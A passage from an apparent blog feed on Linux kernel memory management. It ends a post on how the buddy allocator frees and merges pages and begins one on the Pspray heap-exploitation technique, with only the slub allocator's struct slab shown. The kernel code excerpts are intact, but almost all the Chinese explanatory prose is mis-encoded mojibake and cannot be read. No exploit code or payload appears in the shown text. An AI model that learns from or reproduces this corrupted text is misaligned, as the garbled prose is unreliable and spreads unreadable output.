FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ç‰¹å®šé¡µé¢é‡Šæ”¾åˆ°ç‰¹å®š zone ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ <code>one page</code> ä¸æ˜¯ä¸€å¼ é¡µæ¡†è€Œæ˜¯ä¸€å—è¿ç»­å†…å­˜ï¼ˆå¯èƒ½æœ‰å¤šå¼ é¡µï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªé‡Šæ”¾é¡µé¢çš„åŸºæœ¬å‡½æ•°ï¼Œæ•…æˆ‘ä»¬éœ€è¦æä¾›å¾…é‡Šæ”¾é¡µé¢çš„é¡µç»“æ„ä½“ï¼ˆstruct pageï¼‰ã€é¡µæ¡†å·ã€é¡µé¢å—çš„é˜¶ï¼ˆorderï¼‰ã€ç›®æ ‡ zoneã€è¿ç§»ç±»å‹ç­‰ä¿¡æ¯â€”â€”è¿™äº›ä¿¡æ¯é€šå¸¸ç”±ä¸Šå±‚å°è£…å‡½æ•°æä¾›ï¼Œè¿™ä¸ªå‡½æ•°æ‰€åšçš„åªæ˜¯ç®€å•åœ°å°†é¡µæŒ‚å›å¯¹åº”é“¾è¡¨å¹¶æ£€æŸ¥åˆå¹¶çš„æ“ä½œã€‚è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢é‡Šæ”¾çš„æ ¸å¿ƒå‡½æ•°ï¼Œæ‰€æœ‰çš„é¡µé¢é‡Šæ”¾ API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…ã€‚</p><p>æˆ‘ä»¬å°†ä¸å¾…é‡Šæ”¾é¡µé¢å‡‘æˆä¸€å¯¹çš„å†…å­˜å—ç§°ä¸º buddyï¼Œæ‰€è°“å‡‘æˆä¸€å¯¹ä¾¿æ˜¯è¿™ä¸¤ä¸ªå†…å­˜å—åœ¨ç‰©ç†ä¸Šè¿ç»­ï¼Œä¸”èƒ½å‡‘æˆä¸€ä¸ªæ›´é«˜ä¸€é˜¶çš„å¤§å†…å­˜å—ï¼Œç”±æ­¤ç§°ä¹‹ä¸ºä¸€å¯¹ buddiesã€‚</p><p>æ¥ä¸‹æ¥å¼€å§‹åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„åŸºæœ¬æµç¨‹ï¼š</p><p>é¦–å…ˆè¿™é‡Œé€šè¿‡<code>find_buddy_page_pfn</code>å‡½æ•°å¯»æ‰¾å¹¶æ£€æŸ¥buddyã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">find_buddy_page_pfn</span><span class="params">(struct page *page,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn, <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buddy_pfn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"></span><br><span class="line">buddy = page + (__buddy_pfn - pfn);</span><br><span class="line"><span class="keyword">if</span> (buddy_pfn)</span><br><span class="line">*buddy_pfn = __buddy_pfn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (page_is_buddy(page, buddy, order))</span><br><span class="line"><span class="keyword">return</span> buddy;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šæ ¹æ®å¾…é‡Šæ”¾å †å—çš„pfnå’Œorderå¯»æ‰¾åˆ°buddyçš„pfnï¼Œéšåé€šè¿‡è®¡ç®—æˆ–å¾—åˆ°buddyçš„pageæŒ‡é’ˆï¼Œéšåè°ƒç”¨<code>page_is_buddy</code>æ¥åˆ¤æ–­æ˜¯å¦æ»¡è¶³buddyæ¡ä»¶ã€‚ä¸»è¦æ˜¯ä»¥ä¸‹å››ä¸ªæ¡ä»¶ï¼š</p><ul><li>  buddy ä¸åœ¨ç©ºæ´ä¸­</li><li>  buddy åœ¨ buddy system ä¸­ï¼ˆå³ buddy ä¹Ÿæ˜¯ç©ºé—²å†…å­˜å—ï¼‰</li><li>  å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy åœ¨åŒä¸€ä¸ª zone ä¸­</li><li>  å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy æœ‰ç€åŒæ ·çš„é˜¶ï¼ˆorderï¼‰</li></ul><p>éšåè¿›è¡Œåˆ¤æ–­å¦‚æœorderè¾¾åˆ°äº†<code>pageblock_order</code>é‚£ä¹ˆå°±æ„å‘³ç€å¸¸è§„çš„<code>pageblock</code>å¯èƒ½ä¼šä¸ç‹¬ç«‹çš„<code>pageblock</code>è¿›è¡Œåˆå¹¶ï¼Œä¸ºäº†é¢„é˜²è¿™ä¸€ç°è±¡ï¼Œå†…æ ¸åœ¨è¿™é‡Œå­˜åœ¨ä¸€å¤„åˆ¤æ–­ï¼Œå³<code>if (unlikely(order &gt;= pageblock_order)) &#123;</code>è¿™é‡Œä¼šåˆ¤æ–­æ‰€é€‰æ‹©çš„buddyæ˜¯å¦ä¸ºmergeableï¼Œå¦‚æœæ˜¯å¯ä»¥ç»§ç»­å¢åŠ orderï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è¿›å…¥åˆ°<code>done_merging</code>æ ‡ç­¾ã€‚</p><p>å¾ªç¯æœ€åéªŒè¯æ­¤buddy æ˜¯å¦ä¸º guard pageï¼Œå¦‚æœæ˜¯åˆ™è°ƒç”¨ <code>clear_page_guard()</code> æ¸…é™¤è¿™ä¸ªå±æ€§è®©å…¶å˜æˆç©ºé—²é¡µé¢ï¼Œè¿™é‡Œæ¸…é™¤çš„æ“ä½œæ˜¯é€šè¿‡å°† page ç»“æ„ä½“çš„ private å­—æ®µç½® 0 å®ç°çš„ï¼›è‹¥å¦ï¼Œåˆ™è¯´æ˜æ˜¯å¸¸è§„çš„ç©ºé—²é¡µé¢ï¼Œè°ƒç”¨ <code>del_page_from_free_list()</code> å°†å…¶è„±é“¾ã€‚</p><p>ç»è¿‡å‰é¢çš„æ“ä½œåæˆ‘ä»¬çš„æ–°çš„é«˜é˜¶å†…å­˜å—å°±å®Œæˆåˆæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å›åˆ°å¾ªç¯å¼€å¤´é‡æ–°å¯»æ‰¾è¿™ä¸ªåˆæˆçš„æ–°å†…å­˜å—çš„ buddyï¼Œè¿™ä¸ªå¾ªç¯ä¸€ç›´æŒç»­åˆ° <code>max_order</code> ï¼ˆä¸€èˆ¬æ˜¯10ï¼‰ï¼Œä½œä¸ºä¸‹ä¸€æ¬¡å¾ªç¯çš„é¡µæ¡†å·çš„è®¡ç®—æ–¹å¼æ˜¯ <code>buddy_pfn &amp; pfn</code>ï¼Œä¹‹ååšæŒ‡é’ˆè¿ç®— <code>page + (combined_pfn - pfn)</code> æ‰¾åˆ°å¯¹åº”çš„ page ç»“æ„ä½“ã€‚</p><p>æœ€åè¿›å…¥åˆ°<code>done_merging</code>æ ‡ç­¾ï¼Œè¿™ä¸€æ­¥ä¸»è¦æ˜¯è°ƒç”¨ <code>set_buddy_order()</code> åœ¨ page ç»“æ„ä½“çš„ private å­—æ®µå­˜æ”¾è¯¥å†…å­˜å—çš„ orderï¼Œè‹¥æ˜¯è®¾ç½®äº† <code>FPI_TO_TAIL</code> flagï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸º trueï¼›å¦åˆ™ï¼Œè‹¥å†…å­˜å—çš„ <code>order &gt;= SHUFFLE_ORDER</code>ï¼ˆ<code>MAX_ORDER - 1</code>ï¼‰ï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸ºéšæœºç»“æœï¼ˆ<code>shuffle_pick_tail()</code>ï¼‰ï¼›å¦åˆ™ç½®ä¸ºè°ƒç”¨ <code>buddy_merge_likely()</code> çš„ç»“æœï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²ï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œè¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢ã€‚è‹¥ <code>to_tail</code> ä¸ºçœŸï¼Œåˆ™è°ƒç”¨ <code>add_to_free_list_tail()</code> å°†è¯¥ç©ºé—²é¡µæ·»åŠ åˆ°é“¾è¡¨æœ«å°¾ï¼Œå¦åˆ™è°ƒç”¨ <code>add_to_free_list()</code> æ·»åŠ åˆ°é“¾è¡¨å¼€å¤´ã€‚</p><h2 id="ä¸Šå±‚å°è£…çš„é‡Šæ”¾å‡½æ•°"><a href="#ä¸Šå±‚å°è£…çš„é‡Šæ”¾å‡½æ•°" class="headerlink" title="ä¸Šå±‚å°è£…çš„é‡Šæ”¾å‡½æ•°"></a>ä¸Šå±‚å°è£…çš„é‡Šæ”¾å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __free_pages_ok(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span><br><span class="line">    <span class="keyword">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">int</span> migratetype;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn = page_to_pfn(page);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span> =</span> page_zone(page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!free_pages_prepare(page, order, fpi_flags))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calling get_pfnblock_migratetype() without spin_lock_irqsave() here</span></span><br><span class="line"><span class="comment"> * is used to avoid calling get_pfnblock_migratetype() under the lock.</span></span><br><span class="line"><span class="comment"> * This will reduce the lock holding time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">migratetype = get_pfnblock_migratetype(page, pfn);</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone) ||</span><br><span class="line">is_migrate_isolate(migratetype))) &#123;</span><br><span class="line">migratetype = get_pfnblock_migratetype(page, pfn);</span><br><span class="line">&#125;</span><br><span class="line">__free_one_page(page, pfn, zone, order, migratetype, fpi_flags);</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">__count_vm_events(PGFREE, <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">free_the_page</span><span class="params">(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pcp_allowed_order(order))<span class="comment">/* Via pcp? */</span></span><br><span class="line">free_unref_page(page, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">__free_pages_ok(page, order, FPI_NONE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __free_pages(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* get PageHead before we drop reference */</span></span><br><span class="line"><span class="keyword">int</span> head = PageHead(page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">free_the_page(page, order);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!head)</span><br><span class="line"><span class="keyword">while</span> (order-- &gt; <span class="number">0</span>)</span><br><span class="line">free_the_page(page + (<span class="number">1</span> &lt;&lt; order), order);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__free_pages);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="number">0</span>) &#123;</span><br><span class="line">VM_BUG_ON(!virt_addr_valid((<span class="keyword">void</span> *)addr));</span><br><span class="line">__free_pages(virt_to_page((<span class="keyword">void</span> *)addr), order);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(free_pages);</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰é¡µé¢é‡Šæ”¾çš„å‡½æ•°å…¶å®éƒ½æ˜¯å¯¹ <code>__free_one_page()</code> çš„å°è£…ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼Œå‰é¢æ˜¯å…¶ä¸­ä¸€æ¡è·¯çš„è·¯å¾„ã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ğŸ™ğŸ™ğŸ™ï¼Œè¿™æ®µæ—¶é—´å®åœ¨æ˜¯è¿‡äºæ‡’ç‹—äº†ï¼Œè¿™æ˜¯ä¸€ç¯‡2023å¹´11æœˆ29å·åˆ›å»ºçš„æ–‡ç« ï¼Œä¸€ç›´æ‹–åˆ°ä»Šå¤©æ‰å†™å®Œå¹¶å‘å‡ºæ¥ï¼Œè™½ç„¶è¿™æ®µæ—¶é—´ç¡®å®æ—¶ä¸æ—¶ä¼šæœ‰ä¸€äº›äº‹ä¸è¿‡ä¹Ÿä¸ä¼šè€½è¯¯å¤ªå¤šæ—¶é—´ï¼Œè¯´åˆ°åº•æ˜¯æˆ‘çŠ¯æ‡’æœ‰æ—¶é—´ä¸æƒ³å†™ï¼Œå…¶å®å°±ç®—æ™šä¸Šå»ç©æ¸¸æˆä¹Ÿæ˜¯èƒ½æ—©æ—©å†™å®Œäº†çš„ï¼Œä¸åšæ‡’ç‹—äº†ï¼</p><p>åç»­å…³äºsyzkallerçš„æ–‡ç« å¯èƒ½ä¼šç¼“ä¸€æ®µæ—¶é—´å†ç»§ç»­å†™äº†ï¼Œå› ä¸ºè‡ªå·±çš„fuzzåŸºç¡€å…¶å®ä¸æ˜¯å¾ˆæ‰å®ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å…ˆå»å­¦å­¦æ€æ ·è‡ªå·±å»å®ç°ä¸€ä¸ªfuzzå†å»çœ‹ï¼Œå¦‚æœç›´æ¥çœ‹å°±ç®—æŠŠé€»è¾‘ç†æ¸…æ¥šäº†ä¹Ÿæ²¡æ³•è‡ªå·±åŠ¨æ‰‹æ”¹è¿›ä¹‹ç±»çš„ã€‚</p><p>æ‰€ä»¥åç»­çš„æ›´æ–°å¤§æ¦‚ç‡æ˜¯<code>Linux Rootkit</code>ï¼Œç”¨æˆ·æ€fuzzå®ç°ï¼Œä»0å¼€å§‹å†™æ“ä½œç³»ç»Ÿç­‰ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®è¿™ä¸€ç¯‡æ‰“ç®—çš„æ˜¯å†™&lt;code&gt;syz-fuzzer&lt;/code&gt;éƒ¨åˆ†çš„æºç åˆ†ææˆ–è€…æ˜¯&lt;code&gt;Linux Rootkit&lt;/code&gt;è¿™</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="buddy system" scheme="https://196082.github.io/tags/buddy-system/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="https://196082.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique</title>
    <link href="https://196082.github.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/"/>
    <id>https://196082.github.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/</id>
    <published>2023-11-23T09:05:25.000Z</published>
    <updated>2023-11-29T10:14:05.650Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿‘æœŸåœ¨å·¥ä½œä¸Šé‡åˆ°çš„å†…æ ¸å¾ˆå°‘ï¼Œä»¥è‡³äºæˆ‘éƒ½å¿«å¿˜è®°äº†æˆ‘æ˜¯ç©å†…æ ¸çš„äº†ã€‚è¿™ç¯‡æ–‡ç« éœ€è¦ä¸€ç‚¹<code>slub allocator</code>çš„åŸºç¡€ï¼Œæ‰€ä»¥ä¸ºä»€ä¹ˆæˆ‘ä»¥å‰è¦å·æ‡’ä¸å†™<code>slub allocator</code>å•Šï¼ï¼ï¼å½“ç„¶è¿™äº›åŸºç¡€åœ¨ä»¥å‰éƒ½æ˜¯é»˜è®¤å¤§å®¶éƒ½å·²ç»å­¦ä¹ è¿‡çš„äº†ï¼Œåœ¨è¿™é‡Œè™½ç„¶å¯ä»¥ä¸€æ ·è¿™æ ·ï¼Œä½†æ˜¯æˆ‘è§‰å¾—å¦‚æœå†ä¸åˆ†æä»¥åå¯èƒ½å°±æ²¡å¤šå°‘æ—¶é—´å†™è¿™ç±»åˆ†æç»†è‡´çš„æ–‡ç« äº†ã€‚</p><h2 id="slub-allocatoråŸºæœ¬ç»“æ„"><a href="#slub-allocatoråŸºæœ¬ç»“æ„" class="headerlink" title="slub allocatoråŸºæœ¬ç»“æ„"></a>slub allocatoråŸºæœ¬ç»“æ„</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/ivPnbsjHyI94m5z.png"                                     ></p><p>ä¸Šé¢è¿™å¼ overviewå¤§å®¶åº”è¯¥éƒ½æŒºç†Ÿæ‚‰çš„ã€‚</p><p>äº†è§£è¿‡Linux kernelå†…å­˜ç®¡ç†çš„æœ‹å‹åº”è¯¥çŸ¥é“<code>slab allocator</code>ä¸»è¦æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼š</p><ol><li> slab  æœ€åˆçš„ç‰ˆæœ¬ï¼Œæœºåˆ¶å¤æ‚ï¼Œæ•ˆç‡ä½</li><li> slob  ç”¨äºåµŒå…¥å¼åœºæ™¯çš„æç®€ç‰ˆæœ¬</li><li> slub  ä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œç°åœ¨å¸¸ç”¨</li></ol><p>æ‰€ä»¥åé¢å‡å·²slubä¸ºä¾‹ã€‚</p><h3 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h3><p>Linux kernel ä¸­ç”¨ä»¥ç»Ÿç­¹æ‰€æœ‰å†…å­˜çš„ä¾ç„¶æ˜¯<code>buddy system</code>ï¼Œ<code>slub allocator</code>ä¹Ÿä¸ä¾‹å¤–ï¼Œå…¶è´Ÿè´£å‘<code>buddy system</code>è¯·æ±‚å†…å­˜ååˆ†å‰²ç»™å¤šä¸ªå° object åå†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼Œå•æ¬¡å‘<code>buddy system</code>æ‰€è¯·æ±‚çš„ä¸€ä»½è¿ç»­å†…å­˜é¡µä¾¿ç§°ä¹‹ä¸ºä¸€å¼  slabï¼Œåœ¨å†…æ ¸ä¸­å¯¹åº” <code>slab</code> ç»“æ„ä½“ï¼Œæœ¬è´¨ä¸Šæ˜¯å¤ç”¨ page ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> system_has_freelist_aba</span></span><br><span class="line"><span class="keyword">freelist_aba_t</span> freelist_counter;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹å‰é¢çš„æˆå‘˜ï¼š</p><ul><li>  <code>slab_cache</code>: è¯¥slabå¯¹åº”çš„å†…å­˜æ± </li><li>  <code>freelist</code>: slabä¸Šç©ºé—²çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå½¢å¼ä¸ºå•å‘é“¾è¡¨ä»¥NULLç»“å°¾</li><li>  <code>slab_list</code>: æŒ‰ç…§å…¶ç”¨é€”è¿æ¥å¤šä¸ªslabsåŒå‘é“¾è¡¨</li><li>  <code>inuse</code>: å·²è¢«ä½¿ç”¨çš„å¯¹è±¡æ•°é‡</li><li>  <code>objects</code>: è¯¥slabä¸Šçš„å¯¹è±¡æ€»æ•°</li><li>  <code>frozen</code>: æ˜¯å¦è¢«å†»ç»“ï¼Œå³å…¶å·²ç»å½’å±äºç‰¹å®šçš„CPU</li></ul><blockquote><p>  è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ <strong>counters æˆå‘˜ç›´æ¥æ¶µç›–äº† inuse &amp; objects &amp; frozen</strong>ï¼Œåé¢ä¼šæœ‰å¤§é‡çš„ç›´æ¥é€šè¿‡ counters æˆå‘˜è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ<strong>å®é™…ä¸Šå°±æ˜¯èµ‹å€¼äº† inuse &amp; objects &amp; frozen</strong></p></blockquote><p>å’Œpageç»“æ„ä½“ç±»ä¼¼ï¼Œè¿™é‡Œslabä¹Ÿæ˜¯å¯¹åº”ä¸€å¼ slabå†…å­˜é¡µï¼Œå¯ä»¥é€šè¿‡<code>page_to_pfn</code>å‡½æ•°ç­‰å¯ä»¥ç›´æ¥å®Œæˆslabç»“æ„ä½“åˆ°å†…å­˜é¡µè™šæ‹Ÿåœ°å€çš„è½¬åŒ–ï¼Œå½“ç„¶åè¿‡æ¥ä¹Ÿå¯ä»¥ä»ä¸€ä¸ªç©ºé—²ç©ºé—´çš„è™šæ‹Ÿåœ°å€æ‰¾åˆ°å…¶å¯¹åº”çš„slabç»“æ„ä½“ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/cBXCGF4Z18VLMzl.png"                                     ></p><h3 id="kmem-cache"><a href="#kmem-cache" class="headerlink" 